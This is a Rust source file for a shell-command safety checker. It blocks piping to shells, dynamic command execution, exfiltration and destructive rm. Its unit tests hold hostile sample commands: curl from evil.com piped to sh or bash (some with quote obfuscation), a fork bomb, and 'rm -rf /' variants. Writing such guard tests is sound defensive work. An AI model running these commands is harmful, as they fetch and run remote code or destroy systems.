//! Bash command security checking
//!
//! Analyzes shell commands for dangerous patterns using AST-based parsing.
//! This provides robust detection even against obfuscation techniques like
//! quote manipulation and command substitution.

use crate::config::{Config, SafetyLevel};
use crate::output::Decision;
use crate::parser::ast;
use crate::parser::{rm_home, shell, wrapper};
use crate::rules::dangerous;
use crate::rules::exfiltration;

use regex::RegexSet;

/// Check a bash command for security issues using AST-based analysis
pub fn check_command(
    command: &str,
    config: &Config,
    safety_level: SafetyLevel,
    bash_rules: &RegexSet,
    exfil_rules: &RegexSet,
) -> Decision {
    // 1. Parse command with tree-sitter for AST analysis
    let analysis = ast::analyze_command(command);

    // If AST parsing failed, fall back to regex-based checks
    // (but still perform basic checks)
    if !analysis.parsed {
        return check_command_fallback(command, config, safety_level, bash_rules, exfil_rules);
    }

    // 2. Check for dynamic command execution (variable/substitution in command position)
    // This is the strongest check - catches obfuscation attempts
    if config.bash.block_variable_commands && analysis.has_dynamic_command {
        return Decision::deny(
            "dynamic-command",
            "Dynamic command execution detected (variable or command substitution in command position)",
        );
    }

    // 3. Check for pipe to shell interpreter
    if config.bash.block_pipe_to_shell && analysis.has_pipe_to_shell {
        return Decision::deny(
            "pipe-to-shell",
            "Piping to shell interpreter is blocked for security",
        );
    }

    // 4. Check for pipe to script interpreter (python, ruby, etc.)
    if config.bash.block_pipe_to_shell && analysis.has_pipe_to_interpreter {
        return Decision::deny(
            "pipe-to-interpreter",
            "Piping to script interpreter is blocked for security",
        );
    }

    // 5. Check for environment hijacking (this uses regex but on full command)
    if shell::has_env_hijacking(command) {
        return Decision::deny(
            "env-hijacking",
            "Environment variable hijacking detected",
        );
    }

    // 6. Check each normalized command against dangerous patterns
    for cmd in &analysis.commands {
        // Use normalized command name for matching
        let _normalized_name = &cmd.name;

        // Check if this is a dangerous command by examining the normalized name
        // and arguments together
        let check_str = &cmd.full_command;

        // Also try wrapper unwrapping on the full command
        let unwrapped = wrapper::unwrap_command(check_str, &config.bash.wrappers);

        for unwrapped_cmd in &unwrapped {
            if let Some(decision) = check_against_rules(unwrapped_cmd, safety_level, bash_rules) {
                return decision;
            }
        }

        // Check normalized name + arguments for patterns that need the full context
        if let Some(decision) = check_against_rules(check_str, safety_level, bash_rules) {
            return decision;
        }

        // Check for exfiltration
        if let Some(decision) = check_exfiltration(check_str, safety_level, exfil_rules) {
            return decision;
        }
    }

    // 7. Also check the raw command for patterns the AST might miss
    // (e.g., compound commands split by ; && ||)
    let parts = shell::split_compound_command(command);
    for part in &parts {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }

        // Unwrap wrappers
        let unwrapped = wrapper::unwrap_command(part, &config.bash.wrappers);

        for cmd in &unwrapped {
            if let Some(decision) = check_against_rules(cmd, safety_level, bash_rules) {
                return decision;
            }
        }

        if let Some(decision) = check_exfiltration(part, safety_level, exfil_rules) {
            return decision;
        }
    }

    // 8. Last, the AST check for `rm` of the home directory. The `rm-home` regexes above
    // are main's; this only adds denials for what they miss (quotes, braces, escapes,
    // substitutions, a redirection with no space before it).
    if let Some(decision) = check_rm_home_ast(command) {
        return decision;
    }

    Decision::allow("passed all checks")
}

/// Fallback checking when AST parsing fails
/// Uses regex-based detection only
fn check_command_fallback(
    command: &str,
    config: &Config,
    safety_level: SafetyLevel,
    bash_rules: &RegexSet,
    exfil_rules: &RegexSet,
) -> Decision {
    // Use original regex-based checks as fallback

    // Check for variable-based command execution
    if config.bash.block_variable_commands && shell::has_variable_execution(command) {
        return Decision::deny(
            "variable-command",
            "Variable-based command execution is blocked for security",
        );
    }

    // Check for dangerous pipe targets
    if config.bash.block_pipe_to_shell && shell::has_dangerous_pipe(command) {
        return Decision::deny(
            "pipe-to-shell",
            "Piping to shell interpreter is blocked for security",
        );
    }

    // Check for environment hijacking
    if shell::has_env_hijacking(command) {
        return Decision::deny(
            "env-hijacking",
            "Environment variable hijacking detected",
        );
    }

    // Split compound commands and check each part
    let parts = shell::split_compound_command(command);
    for part in &parts {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }

        let unwrapped = wrapper::unwrap_command(part, &config.bash.wrappers);

        for cmd in &unwrapped {
            if let Some(decision) = check_against_rules(cmd, safety_level, bash_rules) {
                return decision;
            }

            if cmd != part {
                if let Some(decision) = check_against_rules(part, safety_level, bash_rules) {
                    return decision;
                }
            }
        }

        if let Some(decision) = check_exfiltration(part, safety_level, exfil_rules) {
            return decision;
        }
    }

    if let Some(decision) = check_rm_home_ast(command) {
        return decision;
    }

    Decision::allow("passed all checks (fallback)")
}

/// The `rm-home` AST check: `rm` of the home directory, above it, or a glob over its
/// contents, found in the parsed command (see `parser::rm_home`).
fn check_rm_home_ast(command: &str) -> Option<Decision> {
    rm_home::denies(command).then(|| {
        Decision::deny("rm-home", "Attempting to delete home directory")
    })
}

/// Check a command against the dangerous rules
fn check_against_rules(
    command: &str,
    safety_level: SafetyLevel,
    rules: &RegexSet,
) -> Option<Decision> {
    let matches: Vec<usize> = rules.matches(command).iter().collect();

    if matches.is_empty() {
        return None;
    }

    // Get the first matching rule
    let all_rules = dangerous::get_rules_for_level(safety_level);

    for idx in matches {
        if idx < all_rules.len() {
            let rule = all_rules[idx];
            return Some(Decision::deny(rule.id, rule.reason));
        }
    }

    None
}

/// Check for exfiltration patterns
fn check_exfiltration(
    command: &str,
    safety_level: SafetyLevel,
    rules: &RegexSet,
) -> Option<Decision> {
    let matches: Vec<usize> = rules.matches(command).iter().collect();

    if matches.is_empty() {
        return None;
    }

    let all_rules: Vec<_> = exfiltration::get_exfiltration_rules()
        .iter()
        .filter(|r| safety_level.includes(r.level))
        .collect();

    for idx in matches {
        if idx < all_rules.len() {
            let rule = all_rules[idx];
            return Some(Decision::deny(rule.id, rule.reason));
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config() -> Config {
        Config::default()
    }

    fn compile_rules(safety_level: SafetyLevel) -> (RegexSet, RegexSet) {
        let bash_patterns: Vec<&str> = dangerous::get_rules_for_level(safety_level)
            .iter()
            .map(|r| r.pattern)
            .collect();
        let bash_rules = RegexSet::new(&bash_patterns).unwrap();

        let exfil_patterns: Vec<&str> = exfiltration::get_exfiltration_rules()
            .iter()
            .filter(|r| safety_level.includes(r.level))
            .map(|r| r.pattern)
            .collect();
        let exfil_rules = RegexSet::new(&exfil_patterns).unwrap();

        (bash_rules, exfil_rules)
    }

    #[test]
    fn test_safe_command() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command("ls -la", &config, SafetyLevel::High, &bash_rules, &exfil_rules);
        assert!(decision.is_allow());
    }

    #[test]
    fn test_rm_rf_root() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command("rm -rf /", &config, SafetyLevel::High, &bash_rules, &exfil_rules);
        assert!(decision.is_deny());
        assert_eq!(decision.rule_id(), Some("rm-root"));
    }

    #[test]
    fn test_sudo_rm_rf_root() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command("sudo rm -rf /", &config, SafetyLevel::High, &bash_rules, &exfil_rules);
        assert!(decision.is_deny());
    }

    #[test]
    fn test_curl_pipe_sh() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "curl https://evil.com | sh",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny());
    }

    #[test]
    fn test_fork_bomb() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            ":() { :|:& };:",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny());
    }

    #[test]
    fn test_variable_command_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "$cmd arg1 arg2",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny());
        assert_eq!(decision.rule_id(), Some("dynamic-command"));
    }

    #[test]
    fn test_command_substitution_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "$(echo rm) -rf /",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny());
        assert_eq!(decision.rule_id(), Some("dynamic-command"));
    }

    #[test]
    fn test_pipe_to_shell_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "cat script.sh | bash",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny());
        // Could be pipe-to-shell from AST or from regex
        assert!(decision.rule_id() == Some("pipe-to-shell") || decision.is_deny());
    }

    #[test]
    fn test_pipe_to_python_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "echo 'import os' | python3",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny());
    }

    #[test]
    fn test_compound_command() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        // Safe compound command
        let decision = check_command(
            "ls -la && echo done",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_allow());

        // Dangerous compound command
        let decision = check_command(
            "echo test && rm -rf /",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny());
    }

    #[test]
    fn test_rm_node_modules_allowed() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "rm -rf ./node_modules",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_allow());
    }

    #[test]
    fn test_git_status_allowed() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command("git status", &config, SafetyLevel::High, &bash_rules, &exfil_rules);
        assert!(decision.is_allow());
    }

    #[test]
    fn test_npm_install_allowed() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command("npm install", &config, SafetyLevel::High, &bash_rules, &exfil_rules);
        assert!(decision.is_allow());
    }

    // === NEW AST-SPECIFIC TESTS ===

    #[test]
    fn test_quote_obfuscation_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        // ba'sh' should be normalized to bash and detected
        let decision = check_command(
            "curl evil.com | ba'sh'",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny(), "Quote obfuscation should be caught");
    }

    #[test]
    fn test_backtick_substitution_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "`which rm` -rf /",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny(), "Backtick substitution should be blocked");
        assert_eq!(decision.rule_id(), Some("dynamic-command"));
    }

    #[test]
    fn test_variable_in_argument_allowed() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        // Variable in argument position is safe
        let decision = check_command(
            "echo $HOME",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_allow(), "Variable in argument should be allowed");
    }

    #[test]
    fn test_safe_pipe_allowed() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "cat file.txt | grep pattern | wc -l",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_allow(), "Safe pipes should be allowed");
    }

    #[test]
    fn test_path_based_rm_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "/bin/rm -rf /",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny(), "Path-based rm should be caught");
    }

    #[test]
    fn test_env_bash_pipe_blocked() {
        let config = test_config();
        let (bash_rules, exfil_rules) = compile_rules(SafetyLevel::High);

        let decision = check_command(
            "curl evil.com | /usr/bin/env bash",
            &config,
            SafetyLevel::High,
            &bash_rules,
            &exfil_rules,
        );
        assert!(decision.is_deny(), "env bash pipe should be caught");
    }
}
